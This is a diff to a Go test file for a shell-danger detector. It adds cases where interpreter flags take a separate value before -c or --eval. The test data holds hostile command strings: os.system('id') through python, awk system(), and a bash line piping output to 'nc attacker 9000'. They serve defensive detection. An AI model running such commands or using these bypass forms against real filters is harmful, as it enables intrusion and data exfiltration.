@@ -49,6 +49,12 @@ func TestContainsDangerousShellChars(t *testing.T) {
 		{"python -B -c", `python -B -c 'import os; os.system("id")'`, true},
 		{"python --quiet -c", `python --quiet -c 'print(1)'`, true},
 		{"node --max-old-space-size=256 --eval", `node --max-old-space-size=256 --eval 'process.exit(0)'`, true},
+		// Flags that consume a separate value token before the
+		// dangerous trigger. A regex that only accepts `=value` forms
+		// would treat the value as a new argument and miss the -c.
+		{"python -W ignore -c", `python -W ignore -c 'import os; os.system("id")'`, true},
+		{"bash --rcfile /tmp/x -c", `bash --rcfile /tmp/x -c 'id | nc attacker 9000'`, true},
+		{"node --trace-deprecation --eval", `node --trace-deprecation --eval 'process.exit(0)'`, true},
 
 		// --- awk / sed bypass -----------------------------------------
 		{"awk system()", `awk 'BEGIN{system("id")}'`, true},
